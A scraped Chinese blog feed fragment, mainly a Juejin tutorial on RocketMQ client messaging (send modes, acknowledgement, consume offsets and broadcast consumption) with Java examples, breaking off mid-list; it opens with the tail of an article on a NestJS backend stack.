<p>如果只是想把接口“跑起来”，也许只要 <code>NestJS</code> 加上一两个库就够用；但一旦要扛起鉴权、实时协同、AI、文件与搜索这些完整能力，就很容易演变成这篇文章前面列出来的这一整套技术栈：<code>NestJS</code> + <code>TypeScript</code> 打基础，<code>Fastify</code> 提供高性能 HTTP 入口，<code>Prisma</code> + <code>MySql</code> 管数据，<code>Redis</code> + <code>BullMQ</code> 管缓存和队列，<code>Elasticsearch</code> 管搜索，<code>MinIO</code> 管文件，再加上 <code>@nestjs/swagger</code>、<code>class-validator</code>、<code>Prometheus</code>、<code>Terminus</code> 和 <code>OpenAI</code>、<code>LangChain</code> 这些周边，让项目从“能跑”变成“好用、可维护、可扩展”。</p>
<p>对前端转全栈来说，这套组合有两个现实的好处：一是语法和思路都围绕 <code>TypeScript</code> 展开，上手成本可控；二是每一个环节都有成熟的 Nest 集成（模块、装饰器、示例代码），可以按需逐步引入，而不必一口气吃下全部。你可以先用 <code>NestJS</code> + <code>Prisma</code> + <code>Redis</code> 起一个简单项目，再慢慢把队列、搜索、对象存储和 AI 能力补上，最终搭出一套适合自己长期维护的后端脚手架。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RocketMQ从实战到源码：客户端消息机制（万字篇幅）]]></title>    <link>https://juejin.cn/post/7597283981185122356</link>    <guid>https://juejin.cn/post/7597283981185122356</guid>    <pubDate>2026-01-20T14:12:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597283981185122356" data-draft-id="7597243334177374248" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RocketMQ从实战到源码：客户端消息机制（万字篇幅）"/> <meta itemprop="keywords" content="后端,RocketMQ,面试"/> <meta itemprop="datePublished" content="2026-01-20T14:12:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="怒放吧德德"/> <meta itemprop="url" content="https://juejin.cn/user/2502950820787672"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RocketMQ从实战到源码：客户端消息机制（万字篇幅）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2502950820787672/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    怒放吧德德
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:12:51.000Z" title="Tue Jan 20 2026 14:12:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读29分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">RocketMQ从实战到源码：客户端消息机制</h2>
<blockquote>
<p>😄生命不息，写作不止</p>
<p>🔥 继续踏上学习之路，学之分享笔记</p>
<p>👊 总有一天我也能像各位大佬一样</p>
<p>🏆 <a href="https://juejin.cn/user/2502950820787672" target="_blank" title="https://juejin.cn/user/2502950820787672">博客首页</a>   <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnblogs.com%2Flyd-code%2F" target="_blank" title="https://www.cnblogs.com/lyd-code/" ref="nofollow noopener noreferrer">@怒放吧德德</a>  <a href="https://link.juejin.cn?target=https%3A%2F%2Flydandtry.github.io%2F" target="_blank" title="https://lydandtry.github.io/" ref="nofollow noopener noreferrer">To记录领地</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_43843951%3Ftype%3Dblog" target="_blank" title="https://blog.csdn.net/qq_43843951?type=blog" ref="nofollow noopener noreferrer">@一个有梦有戏的人</a></p>
<p>🌝分享学习心得，欢迎指正，大家一起学习成长！</p>
</blockquote>
<p><em>转发请携带作者信息</em>  <strong>@怒放吧德德(掘金) @一个有梦有戏的人(CSDN)</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c33ed4ee428469db4621f0d3f673b67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=ZyU9aRoqKl3hAsUfbYsLVPSurBU%3D" alt="rocketmq封面.png" loading="lazy"/></p>
<h3 data-id="heading-1">前言</h3>
<p>前面一篇文章，我们简单学习了 RockerMQ 的安装以及简单 demo，现在我们就进一步学习 RockerMQ 的消息机制。本篇篇幅较大，内容较多，后续会将每个消息机制进行抽取。</p>
<h3 data-id="heading-2">1 基础使用</h3>
<p>通过 rocket 的代码中的 example 案例，里面有简单的例子。（包：org.apache.rocketmq.example.quickstart）</p>
<p>生产者代码：</p>
<pre><code class="hljs language-shell" lang="shell">public class Producer {

    /**
     * The number of produced messages.
     */
    public static final int MESSAGE_COUNT = 1000;
    public static final String PRODUCER_GROUP = "Study1";
    public static final String DEFAULT_NAMESRVADDR = "192.168.109.134:9876";
    public static final String TOPIC = "TopicTest";
    public static final String TAG = "TagA";

    public static void main(String[] args) throws MQClientException, InterruptedException {

        // 创建生产者，指定生产组
        DefaultMQProducer producer = new DefaultMQProducer(PRODUCER_GROUP);

        // 设置Nameserver地址
        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);

        // 启动生产者
        producer.start();

        for (int i = 0; i &lt; MESSAGE_COUNT; i++) {
            try {
                // 创建消息体：订阅主题、Tag、消息体
                Message msg = new Message(TOPIC,
                        TAG,
                        ("Hello RocketMQ " + i).getBytes(RemotingHelper.DEFAULT_CHARSET)
                );

                // 发送消息
                SendResult sendResult = producer.send(msg, 20 * 1000);
                System.out.printf("%s%n", sendResult);
            } catch (Exception e) {
                e.printStackTrace();
                Thread.sleep(1000);
            }
        }
        // 关闭生产者，释放资源
        producer.shutdown();
    }
}
</code></pre>
<p>消费这代码：</p>
<pre><code class="hljs language-shell" lang="shell">public class Consumer {

    public static final String CONSUMER_GROUP = "Study1";
    public static final String DEFAULT_NAMESRVADDR = "192.168.109.134:9876";
    public static final String TOPIC = "TopicTest";

    public static void main(String[] args) throws MQClientException {

        // 创建消费者，指定消费组
        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);

        // 设置Nameserver地址
        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);

        // 如果特定的消费群体是全新的，请指定从哪里开始
        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);

        // 配置订阅主题Topic、Tag
        consumer.subscribe(TOPIC, "*");

        // 设置回调函数，处理消息
        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -&gt; {
            System.out.printf("%s Receive New Messages: %s %n", Thread.currentThread().getName(), msg);
            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        });

        // 启动消费者，启动后会一直挂着，持续处理消息
        consumer.start();

        System.out.printf("Consumer Started.%n");
    }
}
</code></pre>
<p>客户端编程逻辑顺序比较固定。</p>
<p>① 生产者固定步骤</p>
<ul>
<li>创建生产者，指定生产组</li>
<li>设置Nameserver地址</li>
<li>启动生产者</li>
<li>创建消息体：订阅主题、Tag、消息体</li>
<li>发送消息</li>
<li>关闭生产者，释放资源</li>
</ul>
<p>② 消费者固定步骤</p>
<ul>
<li>创建消费者，指定消费组</li>
<li>设置Nameserver地址</li>
<li>如果特定的消费群体是全新的，请指定从哪里开始</li>
<li>配置订阅主题Topic、Tag</li>
<li>设置回调函数，处理消息</li>
<li>启动消费者，启动后会一直挂着，持续处理消息</li>
</ul>
<h3 data-id="heading-3">2 确认消息机制</h3>
<p>消息是必先要保证安全性，而这包含了两种，一是要确保消息发送到 Broker 上，二是要确保消费者能够正常从 Broker 消费。RocketMQ 提供了完善的消息确认机制，确保消息的可靠传递。主要分为生产者发送确认和消费者消费确认两大部分。</p>
<h4 data-id="heading-4">2.1 生产者端</h4>
<p>生产者通过多次重试的机制保证消息正常发送到 Broker。生产者发送消息后，需要确认 Broker 是否成功接收并持久化消息，核心依赖 Broker 的响应结果，不同发送模式的确认方式不同。消息生产者的 3 种消息发送方法：同步发送、异步发送、单向发送（3 种简单代码上文均有提及）。</p>
<h5 data-id="heading-5">2.1.1 发送模式与确认逻辑</h5>

























<table><thead><tr><th align="center">方式</th><th>确认方式</th><th>场景</th></tr></thead><tbody><tr><td align="center">同步发送</td><td>生产者阻塞等待 Broker 返回<code>SendResult</code>，通过<code>SendStatus.SEND_OK</code>判断是否成功</td><td>核心业务（如交易、支付），必须确保消息投递成功</td></tr><tr><td align="center">异步发送</td><td>通过<code>SendCallback</code>回调函数接收结果：<code>onSuccess</code>表示成功，<code>onException</code>表示失败</td><td>高并发场景，无需阻塞等待结果</td></tr><tr><td align="center">单向发送</td><td>只发送消息，不等待 Broker 响应，无确认机制</td><td>非核心业务（如日志采集），允许少量丢失</td></tr></tbody></table>
<p>Broker 端的刷盘 / 复制策略会影响确认的可靠性：</p>
<ul>
<li><strong>刷盘策略</strong>：同步刷盘（消息写入后立即刷磁盘，确认慢但可靠）、异步刷盘（默认，写入内存后立即返回确认，性能高）；</li>
<li><strong>主从复制</strong>：同步复制（主 Broker 需等待从 Broker 同步完成再确认）、异步复制（默认，主 Broker 写入后直接确认）。</li>
</ul>
<h5 data-id="heading-6">2.1.2 单向发送</h5>
<p>单向发送的情况下，生产者只管往 Broker 发送消息，并不关心 Broker 端是否有接收到。</p>
<pre><code class="hljs language-shell" lang="shell">// 单向发送（无确认）
producer.sendOneway(message);
</code></pre>
<p><code>sendOneway</code>方式发送消息有个好处就是效率高，但是如果 Broker 没收到的时候是无法补救的，适用日志采集这种形式。</p>
<h5 data-id="heading-7">2.1.3 同步发送</h5>
<p>同步发送之后会阻塞当前线程，等待 Broker 响应，直到得到响应，开发可以通过获取的结果去做其他处理，如果发送失败可以进行补救，比如重发或者告警之类。</p>
<pre><code class="hljs language-shell" lang="shell">// 同步发送（有确认）
SendResult sendResult = producer.send(message);
System.out.println("发送状态：" + sendResult.getSendStatus()); // SEND_OK
</code></pre>
<p>SendResult 是 Broker 返回的信息，可以查看状态是否成功。里面有 <code>SendStatus</code>，用来表示发送状态。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">SendStatus</span> {
    SEND_OK,
    FLUSH_DISK_TIMEOUT,
    FLUSH_SLAVE_TIMEOUT,
    SLAVE_NOT_AVAILABLE;

    <span class="hljs-keyword">private</span> <span class="hljs-title function_">SendStatus</span><span class="hljs-params">()</span> {
    }
}
</code></pre>
<p>这个枚举的说明如下：</p>
<ul>
<li><strong>SEND_OK</strong>: 发送成功，消息已持久化到Broker</li>
<li><strong>FLUSH_DISK_TIMEOUT</strong>: 刷盘超时（同步刷盘模式）</li>
<li><strong>FLUSH_SLAVE_TIMEOUT</strong>: 同步到Slave超时（主从模式）</li>
<li><strong>SLAVE_NOT_AVAILABLE</strong>: Slave不可用</li>
</ul>
<blockquote>
<p>但是此时要注意，如果Broker端返回的SendStatus不是SEND_OK，也并不表示消息就⼀定不会推送给下游的消费者。仅仅只是表示Broker端并没有完全正确的处理这些消息。因此，如果要重新发送消息，最好要带上唯⼀的系统标识，这样在消费者端，才能⾃⾏做幂等判断。也就是⽤具有业务含义的OrderID这样的字段来判断消息有没有被重复处理。</p>
</blockquote>
<p>同步的可能会导致发送耗时比较长，影响后续逻辑。</p>
<h5 data-id="heading-8">2.1.4 异步发送</h5>
<p>异步发送机制下，⽣产者在向Broker发送消息时，会同时注册⼀个回调函数。接下来⽣产者并不等待Broker的响应。当Broker端有响应数据过来时，⾃动触发回调函数进⾏对应的处理。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//  异步发送（回调确认）</span>
producer.send(message, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SendCallback</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(SendResult sendResult)</span> {
        <span class="hljs-comment">// 发送成功回调</span>
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onException</span><span class="hljs-params">(Throwable e)</span> {
        <span class="hljs-comment">// 发送失败回调</span>
    }
});
</code></pre>
<p>这个回调函数是用来处理成功与失败的逻辑，如果失败了，就会执行 <code>onException</code>代码逻辑，可以在这里定义对应的补救措施。</p>
<blockquote>
<p>注：触发了SendCallback的onException⽅法同样并不⼀定就表示消息不会向消费者推</p>
<p>送。如果Broker端返回响应信息太慢，超过了超时时间，也会触发 <strong>onException</strong> 方法。</p>
<p>超时默认是 3 秒，通过 <strong>producer.setSendMsgTimeout</strong> 可以修改。</p>
</blockquote>
<h4 data-id="heading-9">2.2 消费者端状态确认机制</h4>
<p>消费者端采用状态确认机制保证消费者⼀定能正常处理对应的消息。消费者的确认机制核心是 <strong>消费偏移量（Offset）的提交</strong> ——Offset 表示消费者消费到队列的哪个位置，Broker 通过 Offset 判断消息是否已被消费。也就是消费者会返回结果给 Broker，Broker等待消费者返回消息处理状态。</p>
<h5 data-id="heading-10">2.2.1 自动确认</h5>
<p>原理：消费线程处理消息时如果<strong>没有抛出异常</strong>，客户端会自动向 Broker 提交 Offset，Broker 标记消息已消费；如果抛出异常，不提交 Offset，Broker 会重试该消息。</p>
<blockquote>
<p>注意：批量消费时，只要有一条消息消费失败，整个批次的 Offset 都不会提交，会重试整个批次。</p>
</blockquote>
<p>代码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// PushConsumer - 自动确认（默认）</span>
<span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(<span class="hljs-string">"group"</span>);
consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -&gt; {
    <span class="hljs-comment">// 业务处理</span>
    <span class="hljs-keyword">for</span> (MessageExt msg : msgs) {
        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(msg.getBody()));
    }
    <span class="hljs-comment">// 自动返回CONSUME_SUCCESS</span>
    <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
});
</code></pre>
<h5 data-id="heading-11">2.2.2 手动确认</h5>
<p>适用于需要精准控制确认时机的场景（如消息消费后需写入数据库，需确保数据库写入成功再确认）。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 手动确认示例</span>
consumer.registerMessageListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageListenerConcurrently</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ConsumeConcurrentlyStatus <span class="hljs-title function_">consumeMessage</span><span class="hljs-params">(
        List&lt;MessageExt&gt; msgs, 
        ConsumeConcurrentlyContext context
    )</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 业务处理</span>
            processMessages(msgs);
            <span class="hljs-comment">// 手动确认成功</span>
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// 返回失败，稍后重试</span>
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.RECONSUME_LATER;
        }
    }
});
</code></pre>
<h5 data-id="heading-12">2.2.3 确认消息的关键</h5>
<p>这个返回值是⼀个枚举值，有两个选项 CONSUME_SUCCESS 和 RECONSUME_LATER。如果消费者返回 CONSUME_SUCCESS，那么消息自然就处理结束了。但是如果消费者没有处理成功，返回的是 RECONSUME_LATER，Broker 就会过⼀段时间再发起消息重试。</p>
<p>消费状态如下：</p>
<ul>
<li>CONSUME_SUCCESS: 消费成功，消息将被删除</li>
<li>RECONSUME_LATER: 消费失败，稍后重试</li>
</ul>
<p>总的来说就是如下几点</p>
<ul>
<li><strong>重试机制</strong>：未确认的消息会进入重试队列（<code>%RETRY%+消费组名</code>），默认重试 16 次，超过次数进入死信队列（<code>%DLQ%+消费组名</code>）；</li>
<li><strong>Offset 存储</strong>：Broker 将消费组 - 队列的 Offset 存储在内置主题<code>consumerOffse</code>中，即使消费者重启也能恢复消费进度；</li>
<li><strong>顺序消费确认</strong>：顺序消费默认是 “手动确认变种”，通过加锁机制保证消费顺序，只有当前消息确认后才会消费下一条。</li>
</ul>
<h4 data-id="heading-13">2.3 消费者端自行指定消费点</h4>
<p>Broker 端通过 Consumer 返回的状态来推进所属消费者组对应的 Offset。RocketMQ 可以让消费者自行定义，通过设置 ConsumeFromWhere 与 ConsumeTimestamp 来设置消费起始位置。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(<span class="hljs-string">"group"</span>);

<span class="hljs-comment">// 方法1：从指定时间点开始消费</span>
consumer.setConsumeTimestamp(<span class="hljs-string">"20260101000000"</span>); <span class="hljs-comment">// 格式：yyyyMMddHHmmss</span>

<span class="hljs-comment">// 方法2：指定消费起始位置策略</span>
consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET); <span class="hljs-comment">// 从最早开始</span>
consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);   <span class="hljs-comment">// 从最新开始</span>
consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_TIMESTAMP);    <span class="hljs-comment">// 从指定时间开始</span>
</code></pre>
<p>ConsumeFromWhere：消费位置策略枚举</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ConsumeFromWhere</span> {
    CONSUME_FROM_LAST_OFFSET,      <span class="hljs-comment">// 从队列的第⼀条消息开始重新消费</span>
    CONSUME_FROM_FIRST_OFFSET,     <span class="hljs-comment">// 从上次消费到的地⽅开始继续消费</span>
    CONSUME_FROM_TIMESTAMP         <span class="hljs-comment">// 从某⼀个时间点开始重新消费</span>
}
</code></pre>
<p>如果通过时间点来指定消费，需要指定时间点，这个时间点的格式：<code>yyyyMMddHHmmss</code>。</p>
<h3 data-id="heading-14">3 广播消息</h3>
<p>在 rocketmq 中，主要有两种消息的消费模式，一种是集群消费，另一种是广播消费。</p>
<ol>
<li><strong>集群消费（Clustering）</strong>：默认模式。同一条消息只会被<strong>同一个消费者组（Consumer Group）</strong> 中的<strong>一个</strong>消费者消费。其设计目标是实现负载均衡和高可用，多个消费者共同分担消息处理任务。</li>
<li><strong>广播消费（Broadcasting）</strong>：同一条消息会被<strong>同一个消费者组中的每一个</strong>消费者消费一次。其设计目标是让多个订阅者都接收到完整的消息流。</li>
</ol>
<p>集群模式下，⼀个消息，只会被⼀个消费者组中的多个消费者实例共同处理⼀次。⼴播模式下，⼀个消息，则会推送给所有消费者实例处理，不再关⼼消费者组。</p>
<h4 data-id="heading-15">3.1 简单代码</h4>
<p>JavaAPI 代码</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ！！！关键设置：将消费模式设置为广播模式 ！！！</span>
consumer.setMessageModel(MessageModel.BROADCASTING);
</code></pre>
<p>消息模型枚举有两种，分别是集群和广播</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">MessageModel</span> {
    BROADCASTING(<span class="hljs-string">"BROADCASTING"</span>),
    CLUSTERING(<span class="hljs-string">"CLUSTERING"</span>);
    <span class="hljs-comment">// ....</span>
}
</code></pre>
<blockquote>
<p><strong>实现思路</strong></p>
<p>默认模式(也就是集群模式)下，Broker端会给每个ConsumerGroup维护⼀个统⼀的Offset，这样，当Consumer来拉取消息时，就可以通过Offset保证⼀个消息，在同⼀个ConsumerGroup内只会被消费⼀次。⽽⼴播模式的本质，是将Offset转移到Consumer端⾃⾏保管，包括Offset的记录以及更新，全都放到客户端。这样Broker推送消息时，就不再管ConsumerGroup，只要Consumer来拉取消息，就返回对应的消息。</p>
</blockquote>
<h4 data-id="heading-16">3.2 工作原理</h4>
<p>假设你有一个消费者组 <code>MyConsumerGroup</code>，它下面有三个消费者实例 <code>C1</code>， <code>C2</code>， <code>C3</code>，它们都订阅了主题 <code>MyTopic</code>。</p>
<ul>
<li><strong>在集群模式下</strong>：主题 <code>MyTopic</code> 下的10条消息会以负载均衡的方式（默认为轮询）平均分配给 <code>C1</code>， <code>C2</code>， <code>C3</code> 消费。每个消息只会被其中一个实例消费。</li>
<li><strong>在广播模式下</strong>：主题 <code>MyTopic</code> 下的每一条消息，都会完整地发送给 <code>C1</code>， <code>C2</code>， <code>C3</code> <strong>各一份</strong>。每个消费者实例都会独立消费这10条消息。</li>
</ul>
<pre><code class="hljs language-java" lang="java">集群模式 (负载均衡)        广播模式 (全量复制)
  Msg1 -&gt; [C1]                Msg1 -&gt; [C1]
  Msg2 -&gt; [C2]                Msg2 -&gt; [C1]
  Msg3 -&gt; [C3]      VS        Msg3 -&gt; [C1]
  Msg4 -&gt; [C1]                ... (以此类推，每条消息)
                              Msg1 -&gt; [C2]
                              Msg2 -&gt; [C2]
                              ...
                              Msg1 -&gt; [C3]
                              Msg2 -&gt; [C3]
                              ...
</code></pre>
<h4 data-id="heading-17">3.3 注意事项</h4>
<ol>
<li><strong>消费进度（Offset）管理</strong>：
<ul>
<li><strong>集群模式</strong>：消费进度由Broker端集中存储和管理（新版），所有消费者实例共享同一份进度。如果 <code>C1</code> 消费了 <code>Msg1</code>，整个组就认为 <code>Msg1</code> 已被消费。</li>
<li><strong>广播模式</strong>：<strong>消费进度存储在消费者实例本地</strong>（例如本地文件系统）。每个实例独立维护自己的消费进度，互不影响。<code>C1</code> 消费到哪里，与 <code>C2</code>、<code>C3</code> 完全无关。这意味着如果 <code>C1</code> 实例重启，它会从自己本地的记录开始消费，而不会从其他实例的进度继续。</li>
</ul>
</li>
<li><strong>资源消耗与性能</strong>：
<ul>
